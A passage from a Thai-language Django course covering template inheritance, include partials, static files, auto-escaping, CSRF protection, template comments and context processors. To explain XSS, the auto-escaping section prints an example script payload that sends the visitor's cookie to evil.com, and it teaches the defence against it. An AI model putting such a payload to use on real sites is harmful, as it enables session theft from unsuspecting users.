ลองจินตนาการว่าทุกหน้าของเว็บไซต์ต้องมี `<html>`, `<head>`, navbar, footer เหมือนกัน
ถ้าคัดลอกโครง HTML นี้ไปวางในทุกไฟล์ template (`list.html`, `detail.html`, และหน้า
อื่น ๆ ที่จะเพิ่มในอนาคต) การแก้ navbar เพียงจุดเดียวจะต้องไล่แก้ทุกไฟล์ — ละเมิดหลัก
**DRY** ที่เราย้ำมาตั้งแต่ Part 001

**Template Inheritance** แก้ปัญหานี้ด้วยแนวคิดเดียวกับ class inheritance ใน Python:
สร้างเทมเพลต "แม่" (`base.html`) ที่มีโครงสร้างร่วมทั้งหมด แล้วให้เทมเพลตลูกแต่ละหน้า
**"สืบทอด" (extends)** แล้วเติมเฉพาะส่วนที่ต่างกัน

### 75.2 สร้าง `base.html` จริง

สร้างไฟล์ที่ `templates/base.html` (ระดับโปรเจกต์ ตามที่ตั้งค่า `DIRS` ไว้ในขั้นตอนที่
71.5):

```html
<!-- templates/base.html -->
{% load static %}
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}Django Mastery Blog{% endblock %}</title>
    <link rel="stylesheet" href="{% static 'blog/css/style.css' %}">
    {% block extra_head %}{% endblock %}
</head>
<body>
    {% include 'partials/navbar.html' %}

    <main class="container">
        {% block content %}
        <p>ยังไม่มีเนื้อหา</p>
        {% endblock %}
    </main>

    {% include 'partials/footer.html' %}

    {% block extra_js %}{% endblock %}
</body>
</html>
```

### 75.3 `{% block %}`: จุดที่เทมเพลตลูก "เสียบ" เนื้อหาเข้ามาแทนที่ได้

`{% block name %}...{% endblock %}` ประกาศ "ช่อง" ที่เทมเพลตลูกสามารถ override ได้
เนื้อหาที่อยู่ระหว่าง `{% block %}` และ `{% endblock %}` ใน `base.html` คือ**ค่า
เริ่มต้น**ที่จะแสดง ถ้าเทมเพลตลูกไม่ override block นั้น (เช่น `{% block extra_head %}`
ที่ว่างเปล่าในตัวอย่างข้างบน — ถ้าลูกไม่ประกาศ block นี้ ก็จะไม่มีอะไรแสดงตรงนั้น)

### 75.4 สร้างเทมเพลตลูกด้วย `{% extends %}`

```html
<!-- blog/templates/blog/list.html -->
{% extends 'base.html' %}

{% block title %}บทความทั้งหมด | Django Mastery Blog{% endblock %}

{% block content %}
<h1>บทความทั้งหมด</h1>
<p>เนื้อหาส่วนนี้จะถูก "เสียบ" เข้าไปแทนที่ {% verbatim %}{% block content %}{% endverbatim %} ใน base.html</p>
{% endblock %}
```

**กฎเหล็กของ `{% extends %}`**:

1. **`{% extends %}` ต้องเป็น tag แรกสุดของไฟล์เสมอ** ห้ามมีอะไรอยู่ก่อนมันแม้แต่
   ช่องว่างหรือคอมเมนต์ (ยกเว้น `{% load %}` ที่วางก่อนได้ในบางกรณี — แต่เพื่อความ
   ปลอดภัย ให้วาง `{% extends %}` เป็นบรรทัดแรกสุดเสมอ)
2. **เนื้อหาที่อยู่นอก `{% block %}` ในเทมเพลตลูกจะถูกละเว้นทั้งหมด** เพราะทุกอย่าง
   ที่ไม่ได้อยู่ใน `{% block %}` ไม่มีที่ทางให้ไป — เฉพาะเนื้อหาข้างใน
   `{% block %}...{% endblock %}` เท่านั้นที่จะถูกนำไปแทนที่ block ชื่อเดียวกันใน
   parent template
3. **ชื่อ block ในลูกต้องตรงกับชื่อใน parent เป๊ะ** (case-sensitive)

### 75.5 `{{ block.super }}`: เก็บเนื้อหาเดิมของ parent ไว้ แล้วเพิ่มเติม

บางครั้งเทมเพลตลูกไม่ต้องการ "แทนที่ทั้งหมด" แต่ต้องการ "เพิ่มเติมจากของเดิม"
ใช้ `{{ block.super }}` เพื่อดึงเนื้อหาต้นฉบับของ block นั้นจาก parent กลับมา:

```html
<!-- blog/templates/blog/detail.html -->
{% extends 'base.html' %}

{% block extra_head %}
    {{ block.super }}
    <meta property="og:title" content="{{ post.title }}">
    <meta property="og:type" content="article">
{% endblock %}
```

### 75.6 Multi-Level Inheritance: สืบทอดได้มากกว่า 1 ชั้น

Template Inheritance ไม่จำกัดแค่ 2 ชั้น สามารถสร้างสายการสืบทอดยาวได้ตามต้องการ
เช่น เมื่อแอปเติบโตขึ้นในอนาคต (Phase 4) อาจมีโครงสร้างแบบนี้:

| ชั้น | ไฟล์ | หน้าที่ |
|---|---|---|
| 1 (สูงสุด) | `templates/base.html` | โครง HTML หลักทั้งเว็บไซต์ (navbar, footer) |
| 2 | `blog/templates/blog/base_blog.html` | extends จาก `base.html`, เพิ่ม sidebar เฉพาะโซนบล็อก |
| 3 (ล่างสุด) | `blog/templates/blog/detail.html` | extends จาก `base_blog.html`, ใส่เนื้อหาบทความจริง |

```html
<!-- blog/templates/blog/base_blog.html -->
{% extends 'base.html' %}

{% block content %}
<div class="blog-layout">
    <div class="blog-layout__main">
        {% block blog_content %}{% endblock %}
    </div>
    <aside class="blog-layout__sidebar">
        <h3>หมวดหมู่ยอดนิยม</h3>
        <!-- เนื้อหา sidebar -->
    </aside>
</div>
{% endblock %}
```

```html
<!-- blog/templates/blog/detail.html -->
{% extends 'blog/base_blog.html' %}

{% block blog_content %}
<article>
    <h1>{{ post.title }}</h1>
    {{ post.content|linebreaks }}
</article>
{% endblock %}
```

Pattern นี้ (base ทั่วไป → base เฉพาะโซน → เพจจริง) เป็นแนวทางที่โปรเจกต์ระดับ
production ใช้กันทั่วไป เพื่อลดการเขียนโครง HTML ซ้ำในระดับ "โซน" ของเว็บไซต์
(เช่น โซนบล็อก, โซนแอดมิน, โซนบัญชีผู้ใช้) ในหลักสูตรนี้เราจะใช้แค่ 2 ชั้น
(`base.html` → เพจจริง) ไปก่อนจนกว่าโปรเจกต์จะโตพอที่จะได้ประโยชน์จากชั้นที่ 3

---

## ขั้นตอนที่ 76: `{% include %}` สำหรับแยก Partial Template

### 76.1 `include` ต่างจาก `extends` อย่างไร

มือใหม่มักสับสนระหว่าง `{% extends %}` กับ `{% include %}` เพราะทั้งคู่ "เอาไฟล์อื่น
มาใช้" เหมือนกัน แต่มีความหมายตรงข้ามกันในเชิงทิศทาง:

| | `{% extends %}` | `{% include %}` |
|---|---|---|
| ทิศทางความสัมพันธ์ | เทมเพลตลูก "สืบทอด" จากเทมเพลตแม่ (child → parent) | เทมเพลตหนึ่ง "ดึงชิ้นส่วน" ของอีกเทมเพลตมาแปะ (ฝัง) ตรงจุดที่เรียก |
| จำนวนต่อไฟล์ | ใช้ได้ **1 ครั้งต่อไฟล์** และต้องเป็น tag แรกสุด | ใช้ได้**หลายครั้ง**ตรงไหนก็ได้ในไฟล์ |
| แนวคิด | "โครงสร้างทั้งหน้า" (โครงใหญ่ที่มีช่องให้เติม) | "ชิ้นส่วนที่ใช้ซ้ำ" (component เล็ก ๆ ที่ไม่มีช่องให้เติม) |
| ตัวอย่างการใช้ | `base.html` → `list.html` | navbar, footer, การ์ดสินค้าที่ซ้ำในหลายหน้า |

พูดง่าย ๆ: **`extends` คือ "ฉันคือหน้าหนึ่งในโครงนี้"** ส่วน **`include` คือ
"ฉันอยากยืมชิ้นส่วนนี้มาแปะตรงนี้"**

### 76.2 สร้าง Partial Template: `navbar.html` และ `footer.html`

```html
<!-- templates/partials/navbar.html -->
<nav class="navbar">
    <a href="{% url 'blog:list' %}" class="navbar__brand">Django Mastery Blog</a>
    <ul class="navbar__menu">
        <li><a href="{% url 'blog:list' %}">บทความทั้งหมด</a></li>
    </ul>
</nav>
```

```html
<!-- templates/partials/footer.html -->
<footer class="footer">
    <p>&copy; {% now "Y" %} Django Mastery Course — เขียนด้วย Django {{ django_version|default:"5.x" }}</p>
</footer>
```

> **หมายเหตุ**: `{% now "Y" %}` คือ built-in tag ที่แสดงวันที่/เวลาปัจจุบันตามรูปแบบ
> ที่กำหนด (ใช้ตัวอักษร format เดียวกับ `date` filter ในขั้นตอนที่ 74.3) มีประโยชน์
> มากสำหรับปีลิขสิทธิ์ท้าย footer ที่ไม่ต้องมาคอยแก้เองทุกปี

จากนั้น `include` เข้ามาใน `base.html` ตรงตำแหน่งที่เราเตรียมไว้แล้วในขั้นตอนที่
75.2:

```html
<!-- templates/base.html (ส่วนที่เกี่ยวข้อง) -->
{% include 'partials/navbar.html' %}
<main class="container">
    {% block content %}{% endblock %}
</main>
{% include 'partials/footer.html' %}
```

### 76.3 Context ของ Partial Template: ใช้ตัวแปรจากไฟล์แม่ได้อัตโนมัติ

โดยค่าเริ่มต้น `{% include %}` จะส่ง **context ทั้งหมด** ของเทมเพลตที่เรียกมันเข้าไป
ให้ partial โดยอัตโนมัติ ไม่ต้องส่งซ้ำ เช่น ถ้า `list.html` มีตัวแปร `posts` อยู่ใน
context, partial ที่ include จาก `list.html` ก็จะเห็น `posts` ได้ด้วยเช่นกัน (แม้จะ
ไม่ได้ตั้งใจส่งก็ตาม)

### 76.4 ส่ง Context เพิ่มเติมหรือจำกัดเฉพาะบาง Context ด้วย `with` และ `only`

ถ้าต้องการส่งตัวแปรเพิ่มเติมเข้า partial โดยเฉพาะ ใช้ `with`:

```html
{% include 'partials/post_card.html' with post=featured_post highlight=True %}
```

ถ้าต้องการ **จำกัด** ไม่ให้ partial เห็น context อื่นนอกจากที่ระบุ (เพื่อบังคับให้
partial นั้น "พึ่งพาตัวแปรที่ประกาศชัดเจนเท่านั้น" — ดีต่อการดูแลรักษาในระยะยาว)
ใช้ตัวเลือก `only`:

```html
{% include 'partials/post_card.html' with post=featured_post only %}
```

เมื่อมี `only` ต่อท้าย partial จะเห็น**เฉพาะ** `post` ตัวเดียวเท่านั้น ไม่เห็นตัวแปร
อื่นจาก context เดิมเลย ช่วยลดบั๊กจาก "partial ที่แอบพึ่งพาตัวแปรที่ไม่ได้ประกาศ
ชัดเจน" เมื่อโปรเจกต์ใหญ่ขึ้น

### 76.5 ตัวอย่างจริง: Partial ที่ใช้ซ้ำในหลายหน้า — Post Card

```html
<!-- blog/templates/blog/_post_card.html -->
<article class="post-card">
    <h2><a href="{% url 'blog:detail' slug=post.slug %}">{{ post.title }}</a></h2>
    <p class="post-card__meta">{{ post.created_at|date:"d F Y" }}</p>
    <p class="post-card__excerpt">{{ post.content|truncatewords:25 }}</p>
</article>
```

```html
<!-- blog/templates/blog/list.html (เรียกใช้ post card) -->
{% extends 'base.html' %}

{% block content %}
<h1>บทความทั้งหมด</h1>
{% for post in posts %}
    {% include 'blog/_post_card.html' with post=post only %}
{% empty %}
    <p>ยังไม่มีบทความในขณะนี้</p>
{% endfor %}
{% endblock %}
```

> **ธรรมเนียมการตั้งชื่อไฟล์ partial**: หลายทีมนิยมขึ้นต้นชื่อไฟล์ partial ด้วย
> underscore (`_post_card.html`) เพื่อบอกทันทีว่า "ไฟล์นี้ไม่ได้ออกแบบมาให้ extends
> หรือเรียกตรงจาก view เดี่ยว ๆ แต่ใช้เป็นชิ้นส่วนที่ถูก include เท่านั้น"
> เหมือนธรรมเนียม `_variable.scss` ในโลก CSS/Sass

### 76.6 ข้อควรระวัง: `include` ทำให้ Django Render Template ซ้ำทุกครั้ง

`{% include %}` มีค่าใช้จ่ายด้านประสิทธิภาพเล็กน้อยทุกครั้งที่ถูกเรียก (Django ต้อง
โหลดและ compile ไฟล์นั้นใหม่ทุกครั้ง เว้นแต่จะเปิดใช้ **cached template loader** ใน
production ซึ่งเราจะเรียนใน Phase 9 เรื่อง Performance) สำหรับ partial ขนาดเล็กแบบ
navbar/footer/post-card ผลกระทบนี้แทบไม่มีนัยสำคัญ แต่ถ้า include ไฟล์เดียวกันซ้ำ
หลายร้อยครั้งในหน้าเดียว (เช่น ในลูปยาวมาก) ควรพิจารณาเรื่องนี้เมื่อ optimize
performance ในอนาคต

---

## ขั้นตอนที่ 77: Static Files ใน Template — `{% load static %}` และ `{% static %}`

> **หมายเหตุ**: ขั้นตอนนี้เป็นเพียงการแนะนำเบื้องต้นเท่าที่จำเป็นสำหรับใส่ CSS ลงใน
> `base.html` เท่านั้น รายละเอียดเต็มรูปแบบของระบบ Static Files (การตั้งค่า
> `STATIC_URL`, `STATICFILES_DIRS`, การจัดการไฟล์ตอน deploy ด้วย `collectstatic`,
> WhiteNoise ฯลฯ) จะอยู่ใน **Part 009** ทันทีหลังจาก Part นี้

### 77.1 ทำไมต้อง `{% load static %}` ก่อนใช้ `{% static %}`

Django แบ่ง template tag ออกเป็นกลุ่ม (library) เพื่อไม่ให้ tag ทุกตัวถูกโหลดเข้า
ทุกเทมเพลตโดยไม่จำเป็น (ส่งผลต่อ performance และความชัดเจนของโค้ด) `{% static %}`
อยู่ใน library ชื่อ `static` ซึ่ง**ไม่ได้โหลดมาให้อัตโนมัติ** ต้องสั่ง `{% load static %}`
ก่อนเสมอ (โดยทั่วไปวางไว้บรรทัดแรกสุดของไฟล์ หรือทันทีหลัง `{% extends %}` ถ้ามี)

```html
{% load static %}
```

### 77.2 `{% static %}`: แปลง path ไฟล์เป็น URL ที่ถูกต้อง

```html
{% load static %}
<link rel="stylesheet" href="{% static 'blog/css/style.css' %}">
<img src="{% static 'blog/img/logo.png' %}" alt="โลโก้">
<script src="{% static 'blog/js/main.js' %}"></script>
```

`{% static %}` ทำงานคล้าย `{% url %}` ที่เรียนใน Part 006: **ห้าม hardcode URL
string ของไฟล์ static ตรง ๆ** (เช่น `href="/static/blog/css/style.css"`) เพราะ
ค่า `STATIC_URL` อาจเปลี่ยนได้ในอนาคต (เช่นเมื่อย้ายไฟล์ static ไปเสิร์ฟผ่าน CDN
ที่อยู่คนละ domain ตอน production) การใช้ `{% static %}` ทำให้ template ไม่ต้องรู้
รายละเอียดว่าไฟล์จริงอยู่ที่ไหน ปล่อยให้ระบบ static files จัดการ URL ที่ถูกต้องให้เอง

### 77.3 เตรียมโฟลเดอร์ static ของแอป `blog`

สร้างโฟลเดอร์ static แบบ namespaced เหมือนที่ทำกับ templates (namespacing ด้วยชื่อ
แอปซ้อนอีกชั้น ด้วยเหตุผลเดียวกันกับขั้นตอนที่ 71.4 — ป้องกันไฟล์ชื่อชนกันข้ามแอป):

```bash
mkdir -p blog/static/blog/css
```

```css
/* blog/static/blog/css/style.css */
:root {
    --color-primary: #0b5fff;
    --color-text: #1a1a1a;
    --color-bg: #ffffff;
    --color-muted: #6b7280;
}

* {
    box-sizing: border-box;
}

body {
    margin: 0;
    font-family: "Sarabun", "Segoe UI", sans-serif;
    color: var(--color-text);
    background-color: var(--color-bg);
    line-height: 1.6;
}

.navbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 1rem 2rem;
    background-color: var(--color-primary);
}

.navbar__brand {
    color: #ffffff;
    font-weight: bold;
    text-decoration: none;
    font-size: 1.25rem;
}

.navbar__menu {
    list-style: none;
    display: flex;
    gap: 1.5rem;
    margin: 0;
    padding: 0;
}

.navbar__menu a {
    color: #ffffff;
    text-decoration: none;
}

.container {
    max-width: 720px;
    margin: 0 auto;
    padding: 2rem 1rem;
}

.post-card {
    border-bottom: 1px solid #e5e7eb;
    padding: 1.5rem 0;
}

.post-card__meta {
    color: var(--color-muted);
    font-size: 0.875rem;
}

.footer {
    text-align: center;
    padding: 2rem 1rem;
    color: var(--color-muted);
    font-size: 0.875rem;
}
```

โครงสร้างที่ได้หลังจากนี้:

```
blog/
├── static/
│   └── blog/
│       └── css/
│           └── style.css
└── templates/
    └── blog/
        ├── list.html
        └── detail.html
```

เพราะ `django.contrib.staticfiles` อยู่ใน `INSTALLED_APPS` มาตั้งแต่ `startproject`
(ดูใน Part 005 ข้อ 43.1) และแอป `blog` ก็อยู่ใน `INSTALLED_APPS` แล้ว Django จะหา
ไฟล์นี้เจอโดยอัตโนมัติระหว่างพัฒนา (ด้วย `runserver`) โดยไม่ต้องตั้งค่าเพิ่มใด ๆ เลย
ในโหมด development — รายละเอียดเรื่อง production deployment จะอยู่ใน Part 009

---

## ขั้นตอนที่ 78: Auto-Escaping, การป้องกัน XSS, `{% csrf_token %}`, Comments

### 78.1 XSS (Cross-Site Scripting) คืออะไร

**XSS** คือการโจมตีที่ผู้ไม่หวังดีแทรกโค้ด JavaScript ที่เป็นอันตรายเข้าไปในหน้าเว็บ
ผ่านช่องทางที่เว็บไซต์แสดงข้อมูลที่ผู้ใช้ป้อนเข้ามาโดยไม่ผ่านการกรอง ตัวอย่างสถานการณ์
ที่อันตราย: สมมติระบบบล็อกของเรามีช่องคอมเมนต์ (จะสร้างจริงใน Phase 4) และผู้ใช้
พิมพ์ข้อความนี้เป็นคอมเมนต์:

```
<script>document.location='https://evil.com/steal?cookie=' + document.cookie</script>
```

ถ้าเว็บไซต์นำข้อความนี้ไปแสดงผลตรง ๆ โดยไม่กรอง โค้ด JavaScript นี้จะถูกรันจริงใน
เบราว์เซอร์ของทุกคนที่เปิดหน้านั้น และสามารถขโมย cookie/session ของผู้ใช้ได้ทันที
นี่คือหนึ่งในช่องโหว่ที่พบบ่อยที่สุดในเว็บแอปพลิเคชันทั่วโลก (ติดอันดับ OWASP Top 10
มาตลอด)

### 78.2 Django ป้องกัน XSS ให้อัตโนมัติด้วย Auto-Escaping

ทวนจาก Part 001 ข้อ 2.1: หนึ่งใน "Batteries Included" ของ Django คือระบบป้องกัน XSS
**เปิดใช้งานโดยค่าเริ่มต้น** กลไกนี้เรียกว่า **Auto-Escaping**: ทุกครั้งที่แสดงตัวแปร
ด้วย `{{ }}` Django จะแปลงอักขระ HTML พิเศษให้เป็น HTML entity โดยอัตโนมัติ ก่อน
render:

| อักขระต้นฉบับ | ถูกแปลงเป็น |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `'` | `&#x27;` |
| `"` | `&quot;` |
| `&` | `&amp;` |

ทดลองดูผล: ถ้า context มี `{'comment': "<script>alert('XSS')</script>"}`

```html
<p>{{ comment }}</p>
```

จะ render ออกมาเป็น (มองด้วยตา view-source จะเห็นแบบนี้):

```html
<p>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</p>
```

ซึ่งเบราว์เซอร์จะแสดงเป็น**ข้อความ**`<script>alert('XSS')</script>` ธรรมดาบนหน้าเว็บ
**ไม่รันเป็นโค้ด JavaScript** — ภัยคุกคามถูกปิดกั้นโดยอัตโนมัติโดยที่นักพัฒนาไม่ต้อง
ทำอะไรเพิ่มเลย

### 78.3 เมื่อไหร่ที่ต้องปิด Auto-Escaping ด้วย `safe`

บางครั้งเรา **ตั้งใจ** ต้องการแสดง HTML จริง ๆ ไม่ใช่ข้อความดิบ เช่น เนื้อหาบทความที่
ผ่านการประมวลผลจาก Markdown editor มาเป็น HTML แล้ว (จะเรียนเรื่องนี้ใน Phase 4)
กรณีนี้ใช้ filter `safe` เพื่อบอก Django ว่า "เนื้อหานี้ปลอดภัยแล้ว ไม่ต้อง escape":

```html
{{ post.content_html|safe }}
```

> **คำเตือนที่สำคัญที่สุดของขั้นตอนนี้**: **ห้ามใช้ `safe` กับข้อมูลที่มาจากผู้ใช้
> โดยตรง (user-generated content) โดยไม่ผ่านการกรอง (sanitize) ก่อนเด็ดขาด**
> เพราะเท่ากับปิดการป้องกัน XSS ของ Django ทิ้งไปเอง `safe` ควรใช้เฉพาะกับเนื้อหาที่
> คุณควบคุมแหล่งที่มาได้อย่างแน่นอน (เช่น เนื้อหาที่ผ่าน library กรอง HTML อย่าง
> `bleach` มาแล้ว หรือเนื้อหาที่แอดมินที่เชื่อถือได้เท่านั้นเป็นคนป้อน) เมื่อถึง
> Phase 4 (Forms) เราจะเรียนวิธีจัดการ user-generated content อย่างปลอดภัยโดยละเอียด

ทางเลือกในฝั่ง Python ที่เทียบเท่ากับ `safe` filter คือ `mark_safe()`:

```python
from django.utils.safestring import mark_safe

def render_trusted_html(request):
    trusted_content = mark_safe('<strong>เนื้อหาที่เชื่อถือได้</strong>')
    return render(request, 'blog/trusted.html', {'content': trusted_content})
```

### 78.4 `{% autoescape %}`: ควบคุม Auto-Escaping เป็นช่วง ๆ

ในบางกรณีอยากปิด auto-escape ให้กับ block ทั้งก้อน (ไม่ใช่ทีละตัวแปร) ใช้ tag
`{% autoescape %}`:

```html
{% autoescape off %}
    {{ post.content_html }}
    <p>{{ another_trusted_variable }}</p>
{% endautoescape %}
```

**คำแนะนำ**: หลีกเลี่ยงการใช้ `{% autoescape off %}` ครอบ block ใหญ่ ๆ เพราะเสี่ยงต่อ
การลืมว่ามีตัวแปรอื่นที่ไม่ปลอดภัยปนอยู่ใน block นั้นด้วย **ควรใช้ `safe` filter
เจาะจงทีละตัวแปรเท่าที่จำเป็นจริง ๆ เท่านั้น** เป็นแนวทางที่ปลอดภัยกว่าเสมอ

### 78.5 `{% csrf_token %}`: ป้องกัน Cross-Site Request Forgery

**CSRF (Cross-Site Request Forgery)** คือการโจมตีอีกรูปแบบที่หลอกให้เบราว์เซอร์ของ
เหยื่อ (ที่ login ค้างอยู่) ส่ง request ที่เป็นอันตรายไปยังเว็บไซต์เป้าหมายโดยที่
เหยื่อไม่รู้ตัว (เช่น เปิดเว็บอันตรายที่มีฟอร์มซ่อนไว้ ส่ง POST ไปโอนเงินจากบัญชี
ธนาคารของเหยื่อโดยอัตโนมัติ)

Django ป้องกันเรื่องนี้ด้วยระบบ CSRF token ที่เปิดใช้งานโดยค่าเริ่มต้น (ผ่าน
`CsrfViewMiddleware` ที่อยู่ใน `MIDDLEWARE` ตั้งแต่ `startproject` — จะเรียนเรื่อง
Middleware เต็มรูปแบบใน Part 025) ทุกฟอร์มที่ใช้ method `POST` ต้องมี
`{% csrf_token %}` อยู่ข้างในเสมอ:

```html
<!-- ตัวอย่างรูปแบบฟอร์มที่จะได้เขียนจริงเมื่อถึง Phase 4 (Forms) -->
<form method="post" action="{% url 'blog:add_comment' slug=post.slug %}">
    {% csrf_token %}
    <textarea name="body" required></textarea>
    <button type="submit">ส่งความคิดเห็น</button>
</form>
```

`{% csrf_token %}` จะแทรก hidden input field ที่มี token สุ่มไม่ซ้ำกันในแต่ละ
session เข้าไปในฟอร์ม เมื่อฟอร์มถูก submit Django จะตรวจสอบว่า token ที่ส่งมาตรงกับ
ที่คาดหวังหรือไม่ ถ้าไม่ตรง (เช่น request มาจากเว็บอื่นที่ไม่รู้ token จริง) จะถูก
ปฏิเสธด้วย HTTP 403 Forbidden ทันที

**กฎเหล็ก**: **ฟอร์ม `method="post"` ทุกฟอร์มในหลักสูตรนี้ ต้องมี `{% csrf_token %}`
เสมอ ไม่มีข้อยกเว้น** (ยกเว้นกรณีพิเศษบางอย่างที่จะเรียนใน Part เรื่อง REST API ที่
ใช้กลไกยืนยันตัวตนแบบอื่นแทน) รายละเอียดเต็มรูปแบบของ Forms และการ handle
`request.POST` จะอยู่ใน Phase 4 ของหลักสูตร

### 78.6 Comments ใน Template: `{# #}` และ `{% comment %}`

DTL มี syntax สำหรับเขียนคอมเมนต์ที่**จะไม่ปรากฏใน HTML ที่ render ออกมาเลย**
(ต่างจาก HTML comment `<!-- -->` ที่ยังคงอยู่ใน source ที่ผู้ใช้เปิดดูได้ผ่าน
"View Page Source")

**คอมเมนต์บรรทัดเดียว** ด้วย `{# ... #}`:

```html
{# TODO: เพิ่มปุ่มแชร์ไปยัง social media ตรงนี้ในอนาคต #}
<h1>{{ post.title }}</h1>
```

**คอมเมนต์หลายบรรทัด** ด้วย `{% comment %}` ... `{% endcomment %}` (รองรับข้อความ
อธิบายเหตุผลของการคอมเมนต์ได้ด้วย):

```html
{% comment "ปิดใช้งานชั่วคราวจนกว่าฟีเจอร์ tag จะเสร็จใน Phase 4" %}
<div class="post-tags">
    {% for tag in post.tags.all %}
        <span class="tag">{{ tag.name }}</span>
    {% endfor %}
</div>
{% endcomment %}
```

| ประเภท Comment | มองเห็นใน HTML Source ไหม | เหมาะกับ |
|---|---|---|
| `<!-- HTML comment -->` | เห็น (ผู้ใช้เปิด View Source ดูได้) | โน้ตที่ไม่สำคัญ ไม่มีข้อมูลอ่อนไหว |
| `{# DTL comment #}` | ไม่เห็นเลย | โน้ตสำหรับนักพัฒนา, TODO, คำอธิบายโค้ด |
| `{% comment %}...{% endcomment %}` | ไม่เห็นเลย | "ปิด" (comment out) HTML/DTL หลายบรรทัดชั่วคราว |

**คำแนะนำ**: ใช้ `{# #}` หรือ `{% comment %}` แทน HTML comment เสมอเมื่อคอมเมนต์นั้น
มีข้อมูลที่ไม่ควรเปิดเผยต่อผู้ใช้ปลายทาง (เช่น TODO เกี่ยวกับ business logic
ภายใน หรือ debug notes)

---

## ขั้นตอนที่ 79: Context Processors เบื้องต้น

### 79.1 ปัญหา: ทำไม `{{ request }}` และ `{{ user }}` ใช้ได้โดยไม่ต้องส่งเข้า context เอง

สังเกตไหมว่าตลอด Part นี้เราไม่เคยส่ง `request` หรือ `user` เข้า `context` dict ตอน
เรียก `render()` เลย แต่ในทางปฏิบัติ คุณสามารถเขียนใน template ได้ทันทีว่า:

```html
{% if user.is_authenticated %}
    <p>สวัสดี {{ user.username }}</p>
{% else %}
    <a href="{% url 'login' %}">เข้าสู่ระบบ</a>
{% endif %}

<p>คุณกำลังดูหน้า: {{ request.path }}</p>
```

ทั้ง ๆ ที่ view อาจเขียนสั้น ๆ แค่:

```python
def post_list(request):
    posts = Post.objects.filter(is_published=True)
    return render(request, 'blog/list.html', {'posts': posts})
    # ไม่ได้ส่ง 'user' หรือ 'request' เข้า context เลย!
```

เบื้องหลังของความ "มายากล" นี้คือกลไกที่เรียกว่า **Context Processors**

### 79.2 Context Processor คืออะไร

**Context Processor** คือฟังก์ชัน Python ที่รับ `request` เป็น argument แล้วคืนค่า
เป็น **dict** ของตัวแปรที่จะถูก**เติมเข้า context ของทุก template โดยอัตโนมัติ**
ทุกครั้งที่มีการเรียก `render()` ที่ใช้ `RequestContext` (ซึ่ง shortcut `render()`
ที่เราใช้กันมาตลอดใช้ `RequestContext` เป็นค่าเริ่มต้นอยู่แล้ว)

ย้อนกลับไปดู `TEMPLATES` ใน `config/settings.py` จากขั้นตอนที่ 71.2 จะเห็นรายการ
`context_processors` อยู่ใน `OPTIONS`:

```python
'OPTIONS': {
    'context_processors': [
        'django.template.context_processors.debug',
        'django.template.context_processors.request',
        'django.contrib.auth.context_processors.auth',
        'django.contrib.messages.context_processors.messages',
    ],
},
```

### 79.3 ตาราง Context Processor เริ่มต้นที่ Django ติดตั้งมาให้

| Context Processor | ตัวแปรที่เพิ่มเข้า Context | คำอธิบาย |
|---|---|---|
| `django.template.context_processors.debug` | `debug`, `sql_queries` | ใช้งานได้เมื่อ `DEBUG=True` และ IP อยู่ใน `INTERNAL_IPS` เท่านั้น มีประโยชน์สำหรับ debug ระหว่างพัฒนา |
| `django.template.context_processors.request` | `request` | เพิ่ม HttpRequest object ปัจจุบันเข้า context — นี่คือที่มาของ `{{ request.path }}` |
| `django.contrib.auth.context_processors.auth` | `user`, `perms` | เพิ่มผู้ใช้ปัจจุบัน (`request.user`) และ permission object — ที่มาของ `{{ user.username }}` (จะเรียนเต็มใน Phase 4) |
| `django.contrib.messages.context_processors.messages` | `messages` | เพิ่ม flash messages (เช่น "บันทึกสำเร็จ!") — จะเรียนเต็มใน Part ว่าด้วย Messages Framework |

### 79.4 เขียน Context Processor ของตัวเอง

สมมติเราต้องการให้**ทุกหน้า**ของเว็บไซต์เข้าถึงชื่อเว็บไซต์และจำนวนบทความทั้งหมดได้
โดยไม่ต้องส่งซ้ำในทุก view สามารถเขียน custom context processor ได้ดังนี้:

```python
# blog/context_processors.py
from .models import Post


def site_metadata(request):
    return {
        'site_name': 'Django Mastery Blog',
        'published_post_count': Post.objects.filter(is_published=True).count(),
    }
```

จากนั้นลงทะเบียนเพิ่มเข้าไปใน `context_processors` list:

```python
# config/settings.py
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
                'blog.context_processors.site_metadata',   # ← เพิ่มบรรทัดนี้
            ],
        },
    },
]
```

ตอนนี้**ทุกเทมเพลตในทั้งโปรเจกต์** สามารถใช้ `{{ site_name }}` และ
`{{ published_post_count }}` ได้ทันที โดยไม่ต้องส่งจาก view เลยแม้แต่ที่เดียว:

```html
<!-- templates/partials/footer.html (อัปเดต) -->
<footer class="footer">
    <p>&copy; {% now "Y" %} {{ site_name }} — มีบทความทั้งหมด {{ published_post_count }} เรื่อง</p>
</footer>
```

### 79.5 ข้อควรระวังเรื่อง Performance ของ Custom Context Processor

เพราะ context processor ถูกเรียก **ทุกครั้ง** ที่มีการ render template (ทุก
request ของทุกหน้า) การเขียน logic ที่หนักมาก (เช่น query ฐานข้อมูลที่ซับซ้อนหรือ
เรียก API ภายนอก) ใน context processor จะทำให้**ทุกหน้าของเว็บไซต์ช้าลงพร้อมกัน**
แม้แต่หน้าที่ไม่ได้ใช้ตัวแปรนั้นเลยก็ตาม — ตัวอย่าง `published_post_count` ข้างบน
เป็นตัวอย่างที่ยอมรับได้เพราะเป็น query `.count()` ที่เบามาก แต่ควรหลีกเลี่ยงการใส่
query ที่ซับซ้อนหรือคำนวณหนักไว้ในนี้ หากจำเป็นต้องใช้ข้อมูลหนักในบางหน้าเท่านั้น
ควรส่งผ่าน context ของ view นั้นโดยตรงแทน (เราจะกลับมาพูดเรื่อง caching เพื่อ
บรรเทาปัญหานี้ใน Phase 9)

---

## ขั้นตอนที่ 80: สรุปและแบบฝึกหัด

### 80.1 ประกอบร่างทั้งหมด: `base.html`, `blog/list.html`, `blog/detail.html`

ถึงเวลานำทุกอย่างที่เรียนมาทั้ง Part มาประกอบเป็นเว็บไซต์บล็อกที่ใช้งานได้จริง
